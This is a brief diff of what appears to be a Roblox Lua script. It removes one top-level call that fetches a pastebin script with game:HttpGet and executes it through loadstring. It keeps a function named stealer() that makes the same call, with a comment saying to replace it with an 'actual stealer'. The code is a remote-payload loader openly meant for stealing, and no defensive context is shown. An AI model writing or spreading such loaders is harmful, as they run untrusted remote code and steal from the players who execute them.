@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/MmYs8cDf"))()
-
 local function stealer()
     loadstring(game:HttpGet("https://pastebin.com/raw/MmYs8cDf"))() -- replace with actual stealer
 end
